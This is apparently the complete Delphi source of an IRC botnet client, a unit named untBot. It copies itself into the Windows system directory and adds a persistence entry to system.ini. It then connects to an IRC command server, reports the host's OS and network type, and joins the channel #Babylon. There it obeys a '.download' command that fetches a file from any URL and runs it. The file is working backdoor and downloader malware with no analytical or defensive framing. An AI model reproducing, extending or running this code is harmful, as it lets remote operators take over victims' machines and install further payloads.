   unit untBot;

   interface

   Uses
     Windows, Winsock, WinInet, ShellApi, untFunc;

   Var
     Params        :Array[0..500]Of String;
     Procedure Install(Filename, Mutex       :String);
     Procedure StartBot(IP:String; Port:Integer);
     function URLDownloadToFile(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

   implementation

   //----------- START OF USELESS FUNCTIONS

   Procedure ExecuteFile(F: String; Show:Boolean);
   Begin
     ShellExecute(0,'open',pChar(F),0,0,Integer(Show));
   End;

   Function SysDir: String;
   Var
     sD    :Array[0..256] Of Char;
   Begin
     GetSystemDirectory(@sD, SizeOf(sD));
     Result := String(sD)+'\';
   End;

   Procedure Install(Filename, Mutex       :String);
   Begin
     CopyFile(pChar(Paramstr(0)), pChar(SysDir+Filename), False);
     If CreateMutex(NIL, FALSE, pChar(Mutex)) = ERROR_ALREADY_EXISTS Then ExitProcess(0);
     WritePrivateProfileString('boot','shell',pChar('Explorer.exe '+Filename),'system.ini');
   End;

   function Trim(const S: string): string;
   var
    I, L: Integer;
   begin
    L := Length(S);
    I := 1;
    while (I <= L) and (S[I] <= ' ') do Inc(I);
    if I > L then Result := '' else
     begin
      while S[L] <= ' ' do Dec(L);
      Result := Copy(S, I, L - I + 1);
     end;
   end;

   Function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   function StrToInt(S: string): integer;
   var
    V, Code: integer;
   begin
    Val(S, V, Code);
    Result := V;
   end;

   function IPstr(HostName:String) : String;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('168',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function LowerCase(const S: string): string;
   var
     Ch: Char;
     L: Integer;
     Source, Dest: PChar;
   begin
     L := Length(S);
     SetLength(Result, L);
     Source := Pointer(S);
     Dest := Pointer(Result);
     while L <> 0 do
     begin
       Ch := Source^;
       if (Ch >= 'A') and (Ch <= 'Z') then Inc(Ch, 32);
       Dest^ := Ch;
       Inc(Source);
       Inc(Dest);
       Dec(L);
     end;
   end;

   Function iGetNick(Param:String):String;
   Begin
    Result := Copy(Param, 2, Pos('!', Param)-2);
   End;

   Function iGetIdent(Param:String):String;
   Begin
    Result := Copy(Param, Pos('!', Param)+1, Pos('@', Param)-2);
   End;

   Function iGetHost(Param:String):String;
   Begin
    Result := Copy(Param, Pos('@', Param)+1, Pos(' ', Param)-2);
   End;

   Function iGetFullHost(Param:String):String;
   Begin
    Result := Copy(Param, Pos('!', Param)+1, Pos(' ', Param)-2);
   End;

   Function iGetChannel(Param:String):String;
   Begin
    Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
    Result := Copy(Result, 1, Pos(':', result)-2);
   End;

   Function iGetMessage(Param:String):String;
   Begin
    Result := Copy(Param, Pos('PRIVMSG', Param)+8, Length(Param));
    Result := Copy(Result, Pos(':', result)+1, Length(Result));
    If Copy(Result, Length(Result)-1, 2) = #13#10 Then
      Result := Copy(Result, 1, Length(Result)-2);
   End;

   Function GetNet:String;
   Var
    S:Dword;
   Begin
    S := INTERNET_CONNECTION_LAN;
    If InternetGetConnectedState(@S ,0) Then
     If ((S) And (INTERNET_CONNECTION_LAN) = INTERNET_CONNECTION_LAN) Then
      Result := 'LAN';
    S := INTERNET_CONNECTION_MODEM;
    If InternetGetConnectedState(@S ,0) Then
     If ((S) And (INTERNET_CONNECTION_MODEM) = INTERNET_CONNECTION_MODEM) Then
      Result := 'Dial-up';
   End;

   function GetOS: string;
   const
     cOsUnknown  = 'woot?';
     cOsWin95    = 'Win95';
     cOsWin98    = 'Win98';
     cOsWin98SE  = 'W98SE';
     cOsWinME    = 'WinME';
     cOsWinNT    = 'WinNT';
     cOsWin2000  = 'Win2k';
     cOsXP       = 'WinXP';
   var
     osVerInfo: TOSVersionInfo;
     majorVer, minorVer: Integer;
   begin
     Result := cOsUnknown;
     { set operating system type flag }
     osVerInfo.dwOSVersionInfoSize := SizeOf(TOSVersionInfo);
     if GetVersionEx(osVerInfo) then
     begin
       majorVer := osVerInfo.dwMajorVersion;
       minorVer := osVerInfo.dwMinorVersion;
       case osVerInfo.dwPlatformId of
         VER_PLATFORM_WIN32_NT: { Windows NT/2000 }
           begin
             if majorVer <= 4 then
               Result := cOsWinNT
             else if (majorVer = 5) and (minorVer = 0) then
               Result := cOsWin2000
             else if (majorVer = 5) and (minorVer = 1) then
               Result := cOsXP
             else
               Result := cOsUnknown;
           end;
         VER_PLATFORM_WIN32_WINDOWS:  { Windows 9x/ME }
           begin
             if (majorVer = 4) and (minorVer = 0) then
               Result := cOsWin95
             else if (majorVer = 4) and (minorVer = 10) then
             begin
               if osVerInfo.szCSDVersion[1] = 'A' then
                 Result := cOsWin98SE
               else
                 Result := cOsWin98;
             end
             else if (majorVer = 4) and (minorVer = 90) then
               Result := cOsWinME
             else
               Result := cOsUnknown;
           end;
         else
           Result := cOsUnknown;
       end;
     end
     else
       Result := cOsUnknown;
   end;

   Function RandomNick:String;
   Var
     I: Integer;
   Begin
     Randomize;
     Result := '';
     For I:=0 To 20 Do
       Result := Result + Chr( Random(26)+97 );
   End;

   Procedure GetParams(S: String);
   Var
     Tmp         :String;
     I           :Integer;
   Begin
     S := S + ' ';
     I := 0;

     While Pos(' ', S) > 0 Do
     Begin
       If I = 10 Then Break;
       Tmp := Copy(S, 1, Pos(' ', S)-1);
       S   := Copy(S, Pos(' ', S)+1, Length(S));
       If Tmp <> '' Then
       Begin
         Params[i] := Tmp;
         Inc(I);
       End;
     End;
   End;

   //----------- END OF USELESS FUNCTIONS

   Procedure ReadSock(Sock: TSocket);
   Var
     tmpRecv  :Array[0..26000] Of Char;
     tmpData  :String;
   Label
     Abort;
   Begin

     tmpData := 'USER '+RandomNick+' '+RandomNick+'@mail.com "Chilly" :'+RandomNick+#13#10;
     tmpData := tmpData + 'NICK '+RandomNick+#13#10;
     Send(Sock, tmpData[1], Length(tmpData), 0);
     Sleep(200);
     tmpData := 'CONNECTION '+getNet+#13#10;
     Send(Sock, tmpData[1], Length(tmpData), 0);
     Sleep(200);
     tmpData := 'OSTYPE '+GetOS+#13#10;
     Send(Sock, tmpData[1], Length(tmpData), 0);
     Sleep(200);

     While Recv(Sock, tmpRecv, SizeOf(tmpRecv), 0) > 0 Do
     Begin

       ZeroMemory(@tmpData, SizeOf(tmpData));
       tmpData := tmpRecv;
       ZeroMemory(@tmpRecv, SizeOf(tmpRecv));

       GetParams(iGetMessage(tmpData));

       If Pos('MOTD', tmpData)>0 Then
       Begin
         tmpData := 'JOIN #Babylon'#10;
         Send(Sock, tmpData[1], Length(tmpData), 0);
       End;
       If Pos('PING ', tmpData) >0 Then
       Begin
         tmpData := Copy(tmpData, Pos('PING ', tmpData), Length(tmpData));
         tmpData := Copy(tmpData, 1, Pos(#10, tmpData)-1);
         If tmpData[Length(tmpData)] = #13 Then Delete(tmpData, Length(tmpData), 1);
         Delete(tmpData, 2, 1);
         Insert('O', tmpData, 2);
         Insert(#10, tmpData, Length(tmpData)+1);
         Send(Sock, tmpData[1], Length(tmpData), 0);
       End;
       If LowerCase(Params[0]) = '.exit' Then
         ExitProcess(0);
       If LowerCase(Params[0]) = '.restart' Then
       Begin
         If Params[1] = '' Then Params[1] := '60';
         CloseSocket(Sock);
         Sleep(1000*StrToInt(Params[1]));

       End;
       If LowerCase(Params[0]) = '.download' Then
       Begin
         If Params[1] = '' Then Goto Abort;
         If Params[2] = '' Then Goto Abort;
         If Params[3] = '' Then Goto Abort;

         tmpData := 'PRIVMSG #Babylon :Download '+Params[1]+#13#10;
         Send(Sock, tmpData[1], Length(tmpData), 0);
         Sleep(200);

         URLDownloadToFile(0, pChar(Params[1]), pChar(Params[2]), 0, 0);

         tmpData := 'PRIVMSG #Babylon :Downloaded '+Params[1]+#13#10;
         Send(Sock, tmpData[1], Length(tmpData), 0);
         Sleep(200);

         If Params[3] = '1' Then
         Begin
           If Params[4] = '' Then Params[4] := '1';
           ExeCuteFile(Params[2], Boolean(StrToInt(Params[4])));
           tmpData := 'PRIVMSG #Babylon :Executed '+Params[2]+#13#10;
           Send(Sock, tmpData[1], Length(tmpData), 0);
           Sleep(200);
         End;

         If Params[5] = 'exit' Then ExitProcess(0);
         If Params[5] = 'reboot' Then Begin
           CloseSocket(Sock);
           Sleep(1000*60);
         End;
       End;

   Abort:
     End;

   End;

   Procedure StartBot(IP:String; Port:Integer);
   Var
     Sock: TSocket;
     SockA: TSockAddrIn;
     SockWSA: TWSAData;
   Begin

     IP := IPStr(IP);
     Repeat
       WSAStartUp(MakeWord(2,1),SockWSA);
       Sock := Socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
       SockA.sin_family := AF_INET;
       SockA.sin_port := hTons(Port);
       SockA.sin_addr.S_addr := Inet_Addr(pChar(IP));
       If Connect(Sock, SockA, SizeOf(SockA)) > -1 Then
       Begin
         IrcSocket := Sock;
         ReadSock(Sock);
       End;
       WSACleanUp();
     Until 1=2;

   End;

   end.
